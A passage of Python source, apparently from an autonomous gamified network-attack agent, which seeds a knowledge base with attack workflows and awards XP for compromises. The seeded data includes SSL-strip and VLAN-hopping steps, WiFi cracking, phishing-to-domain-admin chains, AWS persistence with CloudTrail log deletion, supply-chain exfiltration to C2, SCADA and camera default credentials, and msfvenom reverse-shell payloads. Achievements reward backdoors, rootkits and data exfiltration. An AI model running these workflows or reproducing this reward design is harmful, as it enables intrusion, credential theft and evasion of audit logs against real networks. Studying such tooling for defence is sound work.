                "4. Configure iptables: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080",
                "5. Monitor captured credentials on port 8080",
            ],
            "tools": ["sslstrip", "arpspoof", "iptables"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "vxlan_hijack", {
            "name": "VXLAN Network Hijacking",
            "steps": [
                "1. Capture VXLAN traffic: tcpdump -i eth0 -w vxlan.pcap 'udp port 4789'",
                "2. Decode VXLAN headers: tshark -r vxlan.pcap -Y vxlan",
                "3. Inject crafted VXLAN frames into target network",
                "4. If no authentication: inject ARP replies for MITM",
            ],
            "tools": ["tcpdump", "tshark", "scapy"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "vlan_hopping", {
            "name": "VLAN Hopping Attack",
            "steps": [
                "1. Craft double-tagged frame: scapy Ether(dst='ff:ff:ff:ff:ff:ff',type=0x8100)/Dot1Q(vlan=1)/Dot1Q(vlan=target_vlan)/IP()/ICMP()",
                "2. Send via spoofed trunk negotiation: DTP frames",
                "3. Switch becomes trunk port, all VLANs accessible",
                "4. Access target VLAN and perform MITM",
            ],
            "tools": ["scapy", "yersinia"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "ipv6_spoofing", {
            "name": "IPv6 Router Advertisement Spoofing",
            "steps": [
                "1. Send Router Advertisement: fake_router6 -i eth0 -r fd00::1/64",
                "2. All IPv6 hosts on segment configure attacker as default gateway",
                "3. Capture IPv6 traffic: tcpdump -i eth0 ip6",
                "4. Combine with DNSv6 spoofing for full MITM",
            ],
            "tools": ["fake_router6", "tcpdump"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # MORE ATTACK WORKFLOWS (8)
        # ══════════════════════════════════════════════════════
        seed.append(("workflow", "wifi_crack_full_chain", {
            "name": "WiFi to Network Pivot Workflow",
            "phases": [
                "1. Recon: airodump-ng --scan 10s to find networks",
                "2. Target selection: pick open or weak network",
                "3. Capture: airodump-ng --bssid TARGET -c CHANNEL -w cap",
                "4. Deauth: aireplay-ng --deauth 10 -a TARGET wlan0mon",
                "5. Crack: aircrack-ng -w rockyou.txt cap-01.cap",
                "6. Connect: iwconfig wlan0 essid NAME key PASSWORD",
                "7. Pivot: nmap -sn INTERNAL_NET/24",
                "8. Deep scan: nmap -sV -sC -T4 discovered_hosts",
            ],
            "tools": ["aircrack-ng", "nmap", "iwconfig"],
            "requires_auth": True,
            "estimated_time": "2-8 hours",
        }, "internal"))
        seed.append(("workflow", "phishing_to_domain_admin", {
            "name": "Phishing to Domain Admin Workflow",
            "phases": [
                "1. Recon: enum4linux, theHarvester for emails and subdomains",
                "2. Phishing: generate payload with msfvenom, send via email",
                "3. Initial access: catch reverse shell, migrate to stable process",
                "4. Enumerate: BloodHound, SharpHound for AD paths",
                "5. Credential harvest: Mimikatz, LaZagne",
                "6. Lateral movement: Pass-the-Hash, Evil-WinRM",
                "7. Escalate: Kerberoasting, DCSync, Golden Ticket",
                "8. Persist: Golden Ticket, scheduled tasks, GPO",
            ],
            "tools": ["theHarvester", "msfvenom", "Mimikatz", "BloodHound"],
            "requires_auth": True,
            "estimated_time": "1-3 days",
        }, "internal"))
        seed.append(("workflow", "web_app_full_pwn", {
            "name": "Web Application Full Compromise",
            "phases": [
                "1. Recon: subfinder -d target.com; httpx -l subs.txt",
                "2. Crawl: gospider -s http://target -d 3 --other-source",
                "3. Enum: gobuster dir -u http://target -w common.txt -x php,html,js",
                "4. Vuln scan: nikto -h http://target; nmap --script http-vuln*",
                "5. Auth test: hydra -l admin -P wordlist.txt http-post-form",
                "6. SQLi: sqlmap -u 'http://target/?id=1' --dbs --batch",
                "7. File upload: test with webshell variants",
                "8. RCE: chain SSRF + file upload or deserialization",
            ],
            "tools": ["subfinder", "httpx", "gobuster", "nikto", "sqlmap", "msfconsole"],
            "requires_auth": True,
            "estimated_time": "4-12 hours",
        }, "internal"))
        seed.append(("workflow", "red_team_infrastructure", {
            "name": "Red Team Infrastructure Setup",
            "phases": [
                "1. Set up C2: install Cobalt Strike or Sliver on VPS",
                "2. Configure domain fronting: CDN -> VPS -> C2",
                "3. Set up phishing: GoPhish with email templates",
                "4. Redirector: nginx reverse proxy with TLS",
                "5. Listener setup: HTTP, DNS, SMB listeners",
                "6. Payload generation: staged/stageless for each OS",
                "7. Operational security: burner emails, VPN, proxy chains",
            ],
            "tools": ["Sliver", "GoPhish", "nginx", "CloudFlare"],
            "requires_auth": True,
            "estimated_time": "1-2 days",
        }, "internal"))
        seed.append(("workflow", "wireless_full_audit_workflow", {
            "name": "Complete Wireless Environment Audit",
            "phases": [
                "1. Widen survey: airodump-ng for all APs in range",
                "2. Client enumeration: identify all connected clients",
                "3. Evil twin: hostapd-wpe for credential capture",
                "4. Handshake capture: targeted deauth + capture",
                "5. WPS attack: reaver for PIN brute force",
                "6. Enterprise test: freeradius-wpe for 802.1X",
                "7. Report: all findings, risk levels, remediation",
            ],
            "tools": ["airodump-ng", "hostapd-wpe", "reaver", "aircrack-ng"],
            "requires_auth": True,
            "estimated_time": "6-16 hours",
        }, "internal"))
        seed.append(("workflow", "cloud_red_team_aws", {
            "name": "AWS Red Team Workflow",
            "phases": [
                "1. Enumerate: pacu for AWS enumeration",
                "2. Access keys: check for exposed keys in repos, configs",
                "3. Lateral movement: assume roles, create users",
                "4. Data access: S3 bucket enumeration, RDS access",
                "5. Persistence: create backdoor IAM users, Lambda triggers",
                "6. Privilege escalation: attach admin policies",
                "7. Cover: delete CloudTrail logs, modify timestamps",
            ],
            "tools": ["pacu", "aws-cli", "ScoutSuite"],
            "requires_auth": True,
            "estimated_time": "2-5 days",
        }, "internal"))
        seed.append(("workflow", "supply_chain_attack", {
            "name": "Software Supply Chain Attack",
            "phases": [
                "1. Target identification: popular open source package or dependency",
                "2. Compromise: typosquatting, maintainer account takeover",
                "3. Injection: add malicious code to build scripts or source",
                "4. Distribution: publish to package registry",
                "5. Wait: let users install/update automatically",
                "6. Activation: trigger malicious payload on specific conditions",
                "7. Exfiltrate: send collected data to C2",
            ],
            "tools": ["npm", "pip", "gem"],
            "requires_auth": True,
            "estimated_time": "1-4 weeks",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # DEFAULT CREDENTIALS EXPANDED (3)
        # ══════════════════════════════════════════════════════
        seed.append(("default_creds", "network_equipment", {
            "name": "Network Equipment Default Credentials",
            "credentials": [
                "admin:admin (Cisco, Juniper, MikroTik, Ubiquiti)",
                "admin:password (Fortinet, Palo Alto, SonicWall)",
                "root:admin (Cisco ASA, pfSense, OPNsense)",
                "admin:1234 (Huawei, ZTE, TP-Link)",
                "admin: (empty) (Netgear, D-Link, Linksys)",
                "root:root (Arista, Cumulus)",
                "super:sp-admin (HPE, Aruba)",
                "ubnt:ubnt (Ubiquiti UniFi)",
                "admin:admin123 (MikroTik RouterOS)",
            ],
            "tools": ["hydra", "medusa", "ncrack"],
        }, "internal"))
        seed.append(("default_creds", "cameras_nvr", {
            "name": "Camera/NVR Default Credentials",
            "credentials": [
                "admin:admin (Hikvision, Dahua, Axis)",
                "admin:12345 (Uniview, Tiandy)",
                "admin:password (Amcrest, Foscam, Reolink)",
                "root:xc3511 (Generic Chinese cameras)",
                "admin: (empty) (Vivotek, Geovision)",
                "root:root (Axis cameras, older firmware)",
                "admin:888888 (Chinese NVR/DVR)",
                "admin:fliradmin (FLIR cameras)",
            ],
            "tools": ["hydra", "curl"],
        }, "internal"))
        seed.append(("default_creds", "scada_ics", {
            "name": "SCADA/ICS Default Credentials",
            "credentials": [
                "admin:admin (Siemens S7, Schneider)",
                "USER:USER (Allen-Bradley, Rockwell)",
                "admin:password (ABB, Emerson)",
                "root:root (Beckhoff, Wago)",
                "Administrator: (empty) (GE Fanuc)",
                "admin:default (Honeywell, Yokogawa)",
                "operator:operator (Wonderware, iFix)",
            ],
            "tools": ["hydra", "mbtget"],
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # UTILITY REFERENCES EXPANDED (5)
        # ══════════════════════════════════════════════════════
        seed.append(("utility", "hashcat_full_modes", {
            "name": "Hashcat Mode Reference",
            "modes": {
                "0": "MD5",
                "100": "SHA1",
                "1400": "SHA2-256",
                "1700": "SHA2-512",
                "1800": "sha512crypt ($6$)",
                "3200": "bcrypt ($2*)",
                "5500": "NetNTLMv1 / NetNTLMv1+ESS",
                "5600": "NetNTLMv2",
                "7300": "IPMI2 RC-HMAC",
                "7500": "Kerberos 5 AS-REQ Pre-Auth (etype 23)",
                "13100": "Kerberos 5 TGS-REP (etype 23)",
                "18200": "Kerberos 5 AS-REP (etype 23)",
                "22000": "WPA-PBKDF2-PMKID+EAPOL",
                "2500": "WPA-EAPOL-PBKDF2 (legacy)",
                "2611": "vBulletin < 3.8.5",
                "12100": "SMF (Simple Machines Forum) > v1.1",
                "400": "phpass (WordPress, phpBB3)",
            },
        }, "internal"))
        seed.append(("utility", "port_forwarding_methods", {
            "name": "Port Forwarding Methods",
            "methods": {
                "ssh_local": "ssh -L 8080:target:80 user@gateway",
                "ssh_remote": "ssh -R 8080:target:80 user@attacker",
                "ssh_dynamic": "ssh -D 1080 user@gateway  # SOCKS proxy",
                "socat": "socat TCP-LISTEN:8080,fork TCP:target:80",
                "chisel": "chisel server --reverse; chisel client attacker:8080 R:socks",
                "ligolo": "ligolo-proxy; ligolo-agent -connect attacker:11601 -retry",
                "nc": "nc -lvp 8080 | nc target 80  # bidirectional pipe",
            },
        }, "internal"))
        seed.append(("utility", "msfvenom_payloads", {
            "name": "MSFvenom Payload Reference",
            "payloads": {
                "linux_reverse_tcp": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf",
                "windows_reverse_tcp": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe",
                "php_reverse": "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php",
                "python_reverse": "msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.py",
                "java_reverse": "msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war",
                "android_reverse": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f apk > shell.apk",
            },
        }, "internal"))
        seed.append(("utility", "wordlist_paths", {
            "name": "Common Wordlist Paths",
            "paths": {
                "rockyou": "/usr/share/wordlists/rockyou.txt",
                "seclists": "/usr/share/seclists/",
                "dirbuster_medium": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                "common_web": "/usr/share/seclists/Discovery/Web-Content/common.txt",
                "big_web": "/usr/share/seclists/Discovery/Web-Content/big.txt",
                "directory_list": "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
                "dns_names": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "usernames": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
            },
        }, "internal"))
        seed.append(("utility", "nmap_nse_scripts", {
            "name": "Nmap NSE Script Categories",
            "categories": {
                "vuln": "nmap --script vuln -T4 target",
                "auth": "nmap --script auth -p 21,22,23,80 target",
                "discovery": "nmap --script discovery -p 80,443,8080 target",
                "brute": "nmap --script brute -p 21,22,23,3306,5432 target",
                "default": "nmap -sC target  # equivalent to --script default",
                "safe": "nmap --script safe target",
                "exploit": "nmap --script exploit target  # use with caution",
                "intrusive": "nmap --script intrusive target  # may crash services",
            },
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # REPORT TEMPLATES EXPANDED (3)
        # ══════════════════════════════════════════════════════
        seed.append(("report_template", "full_engagement_report", {
            "name": "Full Penetration Test Report Template",
            "sections": [
                "1. Executive Summary (non-technical overview, risk rating)",
                "2. Scope and Methodology (targets, tools, techniques)",
                "3. Network Architecture (topology diagram, VLANs, segmentation)",
                "4. Findings Summary (risk matrix: Critical/High/Medium/Low)",
                "5. Detailed Findings (per finding: description, evidence, CVE, impact, remediation)",
                "6. Attack Narratives (step-by-step chains showing compromise paths)",
                "7. Recommendations (prioritized, with timelines)",
                "8. Appendices (raw scans, tool output, hashes, screenshots)",
            ],
        }, "internal"))
        seed.append(("report_template", "vulnerability_assessment_report", {
            "name": "Vulnerability Assessment Report Template",
            "sections": [
                "1. Assessment Overview (scope, date, assessor)",
                "2. Executive Dashboard (risk score, chart, key metrics)",
                "3. Vulnerability Statistics (by severity, type, OS/service)",
                "4. Critical Findings (detailed with CVE, CVSS, evidence)",
                "5. High Findings",
                "6. Medium Findings",
                "7. Low Findings",
                "8. Remediation Roadmap (immediate, 30-day, 90-day)",
            ],
        }, "internal"))
        seed.append(("report_template", "wireless_security_report", {
            "name": "Wireless Security Assessment Report",
            "sections": [
                "1. Wireless Environment Overview (SSIDs, standards, coverage)",
                "2. Access Point Inventory (model, firmware, config)",
                "3. Client Device Inventory (OS, connected AP, protocols)",
                "4. Encryption Assessment (WEP/WPA/WPA2/WPA3 analysis)",
                "5. Authentication Testing (PSK, Enterprise, RADIUS)",
                "6. Attack Results (handshakes captured, cracks, evil twin success)",
                "7. Rogue AP Detection",
                "8. Recommendations (encryption, segmentation, monitoring)",
            ],
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # STAGING / LOGGING ALL TO KNOWLEDGE
        # ══════════════════════════════════════════════════════
        for category, key, value, source in seed:
            self.log_knowledge(category, key, value, source=source)

        logger.info(f"Seeded {len(seed)} knowledge entries (massive)")
        self.save_state()

    def save_state(self):
        """Persist state to disk."""
        try:
            state_file = self._data_dir / "state.json"
            with open(state_file, 'w') as f:
                json.dump({
                    "xp": self._xp,
                    "level": self._level,
                    "total_xp": self._total_xp,
                    "achievements": self._achievements,
                    "streaks": self._streaks,
                    "stats": self._stats,
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save state: {e}")

        # Persist devices so we don't re-discover and re-award XP
        try:
            devices_file = self._data_dir / "devices.json"
            devs = {}
            for ip, dev in self._devices.items():
                if hasattr(dev, 'to_dict'):
                    devs[ip] = dev.to_dict()
                elif isinstance(dev, dict):
                    devs[ip] = dev
            with open(devices_file, 'w') as f:
                json.dump(devs, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save devices: {e}")

        try:
            knowledge_file = self._data_dir / "knowledge.json"
            with open(knowledge_file, 'w') as f:
                json.dump(self._knowledge_log[-5000:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save knowledge: {e}")

        try:
            events_file = self._data_dir / "events.json"
            with open(events_file, 'w') as f:
                json.dump(self._event_log[-1000:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save events: {e}")

        try:
            mistakes_file = self._data_dir / "mistakes.json"
            with open(mistakes_file, 'w') as f:
                json.dump(self._mistakes[-200:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save mistakes: {e}")

    @property
    def state(self) -> TamaState:
        return self._state

    def get_status(self) -> Dict[str, Any]:
        return {
            "state": self._state.value,
            "running": self._running,
            "paused": self._paused,
            "current_phase": self._current_phase,
            "phase_progress": self._phase_progress,
            "pending_notifications": sum(
                1 for n in self._notifications
                if n.needs_auth and n.auth_status == AuthStatus.PENDING
            ),
            "total_notifications": len(self._notifications),
            "pending_exploits": sum(
                1 for e in self._exploit_queue
                if e.auth_status == AuthStatus.PENDING
            ),
            "active_cracks": sum(
                1 for c in self._crack_sessions if c.status == "running"
            ),
            "stats": self._stats,
            "ollama_paused": self._ollama_was_running,
            "current_thought": self._current_thought,
            "thinking_log": self._thinking_log[-50:],
            # Gamification
            "xp": self._xp,
            "level": self._level,
            "level_name": self._get_level_name(),
            "total_xp": self._total_xp,
            "xp_to_next": self._xp_to_next_level(),
            "xp_progress": self._xp_progress(),
            "achievements": self._achievements,
            "achievements_total": len(self.ACHIEVEMENTS),
            "streaks": self._streaks,
            "mistakes_count": len(self._mistakes),
            "knowledge_stats": self.get_knowledge_stats(),
        }

    # ── Gamification Methods ─────────────────────────────────

    def award_xp(self, action: str, amount: int = 0, detail: str = "") -> int:
        """Award XP for an action. Returns actual XP gained (may differ with multipliers)."""
        base = amount or self.XP_WEIGHTS.get(action, 5)

        # Streak bonus: +10% per streak level (max +50%)
        streak_key = action.split("_")[0] if "_" in action else action
        streak = self._streaks.get(streak_key, 0)
        multiplier = 1.0 + min(streak * 0.1, 0.5)
        final_xp = int(base * multiplier)

        self._xp += final_xp
        self._total_xp += final_xp

        # Level up check
        old_level = self._level
        self._level = self._calculate_level()
        leveled_up = self._level > old_level

        # Log the event
        self._event_log.append({
            "type": "xp",
            "action": action,
            "xp": final_xp,
            "base": base,
            "multiplier": round(multiplier, 1),
            "total": self._total_xp,
            "level": self._level,
            "detail": detail,
            "timestamp": time.time(),
        })

        # Keep log manageable
        if len(self._event_log) > 1000:
            self._event_log = self._event_log[-1000:]

        # Check achievements
        self._check_achievements()

        if leveled_up:
            self._event_log.append({
                "type": "level_up",
                "level": self._level,
                "name": self._get_level_name(),
                "timestamp": time.time(),
            })

        logger.info(f"XP awarded: {final_xp} for {action} (total: {self._total_xp}, level: {self._level})")
        self.save_state()
        return final_xp

    def penalize(self, action: str, amount: int = 0, reason: str = ""):
        """Penalize for mistakes (false positives, failures, etc)."""
        base = amount or abs(self.XP_WEIGHTS.get(action, -5))
        penalty = min(base, self._xp)  # Never go below 0
        self._xp -= penalty

        self._mistakes.append({
            "action": action,
            "penalty": penalty,
            "reason": reason,
            "timestamp": time.time(),
        })

        # Keep mistakes log manageable
        if len(self._mistakes) > 200:
            self._mistakes = self._mistakes[-200:]

        self._event_log.append({
            "type": "penalty",
            "action": action,
            "xp": -penalty,
            "reason": reason,
            "timestamp": time.time(),
        })

        logger.info(f"XP penalty: -{penalty} for {action} (reason: {reason})")
        return penalty

    def record_mistake(self, action: str, expected: str, actual: str):
        """Record a classification/prediction mistake for learning."""
        self._mistakes.append({
            "action": action,
            "expected": expected,
            "actual": actual,
            "timestamp": time.time(),
            "learned": False,
        })
        self.penalize("wrong_classification", reason=f"Expected {expected}, got {actual}")

    def get_learning_data(self) -> Dict[str, Any]:
        """Get data about mistakes and learning progress."""
        unlearned = [m for m in self._mistakes if not m.get("learned")]
        return {
            "total_mistakes": len(self._mistakes),
            "unlearned": len(unlearned),
            "recent_mistakes": self._mistakes[-10:],
            "learning_rate": 1.0 - (len(unlearned) / max(len(self._mistakes), 1)),
            "categories": self._mistake_categories(),
        }

    def _mistake_categories(self) -> Dict[str, int]:
        """Count mistakes by category."""
        cats = {}
        for m in self._mistakes:
            cat = m.get("action", "unknown")
            cats[cat] = cats.get(cat, 0) + 1
        return cats

    def _calculate_level(self) -> int:
        """Calculate level from total XP."""
        level = 1
        for i, threshold in enumerate(self.LEVEL_XP):
            if self._total_xp >= threshold:
                level = i + 1
            else:
                break
        return min(level, len(self.LEVEL_XP))

    def _get_level_name(self) -> str:
        idx = min(self._level - 1, len(self.LEVEL_NAMES) - 1)
        return self.LEVEL_NAMES[idx]

    def _xp_to_next_level(self) -> int:
        if self._level >= len(self.LEVEL_XP):
            return 0
        return self.LEVEL_XP[self._level] - self._total_xp

    def _xp_progress(self) -> float:
        if self._level >= len(self.LEVEL_XP):
            return 1.0
        current = self.LEVEL_XP[self._level - 1] if self._level > 1 else 0
        nxt = self.LEVEL_XP[self._level]
        return (self._total_xp - current) / max(nxt - current, 1)

    def _check_achievements(self):
        """Check and award achievements."""
        new_achievements = []

        def try_achieve(key):
            if key not in self._achievements:
                if key not in self.ACHIEVEMENTS:
                    return
                ach = self.ACHIEVEMENTS[key]
                self._achievements.append(key)
                new_achievements.append(ach)
                self._event_log.append({
                    "type": "achievement",
                    "key": key,
                    "name": ach["name"],
                    "desc": ach["desc"],
                    "icon": ach["icon"],
                    "xp": ach["xp"],
                    "timestamp": time.time(),
                })

        s = self._stats

        # ── Discovery ──
        if s["scans_run"] >= 1:
            try_achieve("first_scan")
        if s["devices_found"] >= 1:
            try_achieve("first_device")
        if s["vulns_found"] >= 1:
            try_achieve("first_vuln")
        if s["devices_found"] >= 10:
            try_achieve("ten_devices")
        if s["devices_found"] >= 50:
            try_achieve("fifty_devices")
        if s["vulns_found"] >= 10:
            try_achieve("ten_vulns")

        # ── Exploitation ──
        if s["exploits_executed"] >= 1:
            try_achieve("first_exploit")
        if s["access_gained"] >= 1:
            try_achieve("first_access")
        if s["access_gained"] >= 5:
            try_achieve("five_access")
        if s["access_gained"] >= 10:
            try_achieve("ten_access")
        if s["backdoors_installed"] >= 1:
            try_achieve("first_backdoor")
        if s["backdoors_installed"] >= 5:
            try_achieve("five_backdoors")
        if s["reverse_shells"] >= 1:
            try_achieve("first_reverse_shell")
        if s["privilege_escalations"] >= 1:
            try_achieve("first_priv_esc")
        if s["privilege_escalations"] >= 5:
            try_achieve("five_priv_esc")
        if s["lateral_movements"] >= 1:
            try_achieve("first_lateral")
        if s["data_exfiltrations"] >= 1:
            try_achieve("first_exfil")

        # ── WiFi ──
        if s["cracks_run"] >= 1:
            try_achieve("first_crack")
        if s["handshakes_captured"] >= 1:
            try_achieve("first_handshake")
        if s["handshakes_captured"] >= 10:
            try_achieve("ten_handshakes")
        if s["wifi_cracks"] >= 1:
            try_achieve("first_wpa_crack")
        if s["wifi_deauths"] >= 1:
            try_achieve("first_deauth")
        if s["evil_twins"] >= 1:
            try_achieve("first_evil_twin")

        # ── Credentials ──
        if s["hashes_cracked"] >= 1:
            try_achieve("first_hash_crack")
        if s["hashes_cracked"] >= 10:
            try_achieve("ten_hashes")
        if s["kerberoasts"] >= 1:
            try_achieve("first_kerberoast")
        if s["credentials_harvested"] >= 3:
            try_achieve("default_creds_hunter")

        # ── Persistence ──
        if s["persistence_established"] >= 1:
            try_achieve("first_persistence")
        if s["persistence_established"] >= 3:
            try_achieve("three_persistence")
        if s["mitm_attacks"] >= 1:
            try_achieve("first_mitm")
        if s["pivot_count"] >= 1:
            try_achieve("first_pivot")

        # ── XP Milestones ──
        if self._total_xp >= 100:
            try_achieve("hundred_xp")
        if self._total_xp >= 1000:
            try_achieve("thousand_xp")
        if self._total_xp >= 5000:
            try_achieve("five_thousand_xp")
        if self._total_xp >= 10000:
            try_achieve("ten_thousand_xp")

        # ── Level Milestones ──
        if self._level >= 5:
            try_achieve("level_5")
        if self._level >= 10:
            try_achieve("level_10")
        if self._level >= 15:
            try_achieve("level_15")
        if self._level >= 20:
            try_achieve("level_20")

        # ── Time-based ──
        hour = time.localtime().tm_hour
        if 2 <= hour <= 5 and s["scans_run"] > 0:
            try_achieve("night_owl")
        if 2 <= hour <= 5 and s.get("cycle_count", 0) >= 5:
            try_achieve("night_stalker")

        # ── Extended milestones ──
        if s["scans_run"] >= 100:
            try_achieve("hundred_scans")
        if s["vulns_found"] >= 20:
            try_achieve("twenty_vulns")
        if s.get("cycle_count", 0) >= 7:
            try_achieve("week_streak")

        # ── Check notification types for advanced achievements ──
        notif_types = {n.type.value for n in self._notifications}
        notif_titles = {n.title.lower() for n in self._notifications}
        if any("ssrf" in t for t in notif_titles):
            try_achieve("first_ssrf")
        if any("xxe" in t for t in notif_titles):
            try_achieve("first_xxe")
        if any("deserialization" in t for t in notif_titles):
            try_achieve("first_deserialization")
        if any("jwt" in t for t in notif_titles):
            try_achieve("first_jwt_bypass")
        if any("graphql" in t for t in notif_titles):
            try_achieve("first_graphql")
        if any("sqli" in t or "sql injection" in t for t in notif_titles):
            try_achieve("first_sqli")
        if any("command injection" in t or "rce" in t for t in notif_titles):
            try_achieve("first_command_injection")
        if any("docker" in t and ("escape" in t or "breakout" in t) for t in notif_titles):
            try_achieve("first_docker_escape")
        if any("kubernetes" in t or "k8s" in t for t in notif_titles):
            try_achieve("first_k8s_rce")
        if any("aws" in t or "cloud" in t for t in notif_titles):
            try_achieve("first_cloud_access")
        if any("iot" in t or "camera" in t or "embedded" in t for t in notif_titles):
            try_achieve("first_iot_hack")
        if any("camera" in t and "access" in t for t in notif_titles):
            try_achieve("first_camera_access")
        if any("scada" in t or "plc" in t or "ics" in t for t in notif_titles):
            try_achieve("first_scada_exploit")
        if any("router" in t and "backdoor" in t for t in notif_titles):
            try_achieve("first_router_backdoor")
        if any("firmware" in t for t in notif_titles):
            try_achieve("firmware_extracted")
        if any("vlan" in t for t in notif_titles):
            try_achieve("first_vlan_hop")
        if any("dns" in t and ("poison" in t or "spoof" in t) for t in notif_titles):
            try_achieve("first_dns_poison")
        if any("dhcp" in t and "rogue" in t for t in notif_titles):
            try_achieve("first_rogue_dhcp")
        if any("pam" in t and "backdoor" in t for t in notif_titles):
            try_achieve("pam_backdoor_installed")
        if any("rootkit" in t for t in notif_titles):
            try_achieve("rootkit_installed")
        if any("golden ticket" in t for t in notif_titles):
            try_achieve("golden_ticket_created")
        if any("webshell" in t for t in notif_titles):
            try_achieve("webshell_deployed")
        if any("token" in t and ("impersonat" in t or "steal" in t) for t in notif_titles):
            try_achieve("first_token_impersonation")
        if any("credential" in t and "dump" in t for t in notif_titles):
            try_achieve("first_credential_dump")
        if any("dns" in t and "exfil" in t for t in notif_titles):
            try_achieve("first_dns_exfil")
        if any("tunnel" in t for t in notif_titles):
            try_achieve("first_tunnel")

        # ── Combo achievements ──
        if s["access_gained"] >= 1 and s["privilege_escalations"] >= 1 and s["backdoors_installed"] >= 1:
            try_achieve("recon_to_root")
        if s["access_gained"] >= 5:
            try_achieve("five_os_types")

        for ach in new_achievements:
            self.award_xp("achievement_unlocked", ach["xp"], ach["name"])

    # ── Authorization Logic ───────────────────────────────────

    def needs_authorization(self, command: str) -> bool:
        """Check if a command requires user authorization."""
        cmd_lower = command.lower()

        # Always safe commands don't need auth
        for pattern in self.SAFE_PATTERNS:
            if pattern in cmd_lower:
                return False

        # Check if command matches auth-required patterns
        for pattern in self.AUTH_REQUIRED_PATTERNS:
            if pattern in cmd_lower:
                return True

        return False

    def _create_vuln_notification(self, ip: str, port: int, vuln_type: str, severity: str, message: str) -> bool:
        """Create a vulnerability notification from analysis. Returns True if new."""
        # Deduplicate: don't re-create same vuln for same ip:port
        for n in self._notifications:
            if n.target == f"{ip}:{port}" and n.type == NotificationType.VULN_FOUND:
                return False
        self.create_notification(
            NotificationType.VULN_FOUND,
            f"{vuln_type.replace('_', ' ').title()}: {ip}:{port}",
            message,
            target=f"{ip}:{port}",
            severity=severity,
        )
        return True

    def create_notification(
        self,
        ntype: NotificationType,
        title: str,
        message: str,
        target: str = "",
        severity: str = "info",
        needs_auth: bool = False,
        exploit_cmd: Optional[str] = None,
    ) -> Notification:
        """Create a notification (and optionally an exploit task). Deduplicates by type+target."""
        # Deduplicate: skip if same type+target already exists
        if target:
            for existing in self._notifications:
                if existing.type == ntype and existing.target == target:
                    return existing

        notif = Notification(
            type=ntype,
            title=title,
            message=message,
            target=target,
            severity=severity,
            needs_auth=needs_auth,
            exploit_cmd=exploit_cmd,
        )
        if needs_auth:
            notif.auth_status = AuthStatus.PENDING

        self._notifications.append(notif)
        self._stats["notifications_created"] += 1

        if exploit_cmd:
            task = ExploitTask(
                target=target,
                command=exploit_cmd,
                needs_auth=needs_auth,
                auth_status=notif.auth_status,
            )
            self._exploit_queue.append(task)

        logger.info(f"Notification: [{ntype.value}] {title} (auth={needs_auth})")
        return notif

    def authorize_notification(self, notification_id: str) -> bool:
        """Authorize a pending notification/exploit."""
        for notif in self._notifications:
            if notif.id == notification_id and notif.needs_auth:
                notif.auth_status = AuthStatus.APPROVED
                notif.auth_at = time.time()
                self._stats["authorizations_granted"] += 1

                # Also approve linked exploit task
                for task in self._exploit_queue:
                    if task.command == notif.exploit_cmd:
                        task.auth_status = AuthStatus.APPROVED

                logger.info(f"Authorized: {notif.title}")
                return True
        return False

    def deny_notification(self, notification_id: str) -> bool:
        """Deny a pending notification."""
        for notif in self._notifications:
            if notif.id == notification_id and notif.needs_auth:
                notif.auth_status = AuthStatus.DENIED
                notif.auth_at = time.time()

                for task in self._exploit_queue:
                    if task.command == notif.exploit_cmd:
                        task.auth_status = AuthStatus.DENIED

                logger.info(f"Denied: {notif.title}")
                return True
        return False

    # ── Knowledge Growth ──────────────────────────────────────

    def _is_known_finding(self, category: str, key: str) -> bool:
        """Check if a finding already exists in the knowledge log."""
        for entry in self._knowledge_log:
            if entry.get("category") == category and entry.get("key") == key:
                return True
        return False

    def _is_known_notification(self, target: str, title_contains: str) -> bool:
        """Check if a notification already exists for this target with matching title."""
        for n in self._notifications:
            if n.target == target and title_contains.lower() in n.title.lower():
                return True
        return False

    def log_knowledge(self, category: str, key: str, value: Any, source: str = ""):
        """Log a piece of knowledge for future reference. Updates existing entry if same category+key."""
        # Deduplicate: update existing entry instead of appending
        for entry in self._knowledge_log:
            if entry.get("category") == category and entry.get("key") == key:
                entry["value"] = value
                entry["source"] = source
                entry["timestamp"] = time.time()
                return

        entry = {
            "category": category,
            "key": key,
            "value": value,
            "source": source,
            "timestamp": time.time(),
        }
        self._knowledge_log.append(entry)

        # Keep knowledge log manageable
        if len(self._knowledge_log) > 5000:
            self._knowledge_log = self._knowledge_log[-5000:]

        # Persist every 10 new entries to avoid excessive I/O
        if len(self._knowledge_log) % 10 == 0:
            self.save_state()

    def get_knowledge(self, category: Optional[str] = None, limit: int = 50) -> List[Dict]:
        """Get knowledge entries, optionally filtered by category."""
        entries = self._knowledge_log
        if category:
            entries = [e for e in entries if e["category"] == category]
        return entries[-limit:]

    def get_knowledge_stats(self) -> Dict[str, int]:
        """Get knowledge stats by category."""
        stats = {}
        for entry in self._knowledge_log:
            cat = entry["category"]
            stats[cat] = stats.get(cat, 0) + 1
        return stats

    # ── Crack Management ──────────────────────────────────────

    async def _pause_ollama(self):
        """Pause Ollama to free GPU for hashcat."""
        try:
